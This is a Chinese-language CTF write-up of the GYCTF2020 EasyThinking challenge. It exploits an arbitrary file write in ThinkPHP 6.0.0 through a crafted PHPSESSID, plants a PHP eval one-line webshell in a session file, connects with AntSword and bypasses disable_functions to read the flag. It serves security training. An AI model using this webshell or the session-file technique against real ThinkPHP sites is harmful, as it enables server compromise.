---
title: '[GYCTF2020]EasyThinking'
date: 2024-06-20 19:11:45
tags: thinkphp
categories: 刷题笔记
---

### [GYCTF2020]EasyThinking（thinkphp6.0.0漏洞）

有登录注册页面，感觉像是二次注入，但当我们恶意注入用户名时，居然发生了报错

![image-20240620192143771](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201921837.png)

报错页面有thinkphp的版本号，结合题目，我们猜测是thinkphp漏洞

![image-20240620192221513](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406201922551.png)

我们百度搜索到thinkphp6.0.0有个任意文件写入漏洞

##### TP6 任意文件操作的利用方式：

构造PHPSESSID的值，改值**长度为32**且为string型，然后就会在/runtime/session/目录下产生一个php文件我们先来看看session目录下的php文件内容是啥

我们注册账号，登录时抓包，然后修改phpsessid=1234567123456712345671234568.php

![image-20240620200652554](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202006594.png)

登录后搜索一句话木马

```
<?php eval($_POST[a]); ?>
```

由于搜索的内容会保存在session里，我们访问session文件

注：文件名前要加sess_

```
/runtime/session/sess_1234567123456712345671234568.php
```

![image-20240620200658815](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202006840.png)

我们用蚁剑连接

![image-20240620201233497](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202012559.png)

连接成功

我们查看根目录，发现个flag和readflag文件

一般我们需要执行readflag来读取flag

但好像直接读取不了

![image-20240620201630828](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202016867.png)

可能存在**disable_functions**，我们用蚁剑插件直接绕过

![image-20240620201836612](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202018667.png)

再执行

![image-20240620201848732](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406202018756.png)

得到flag
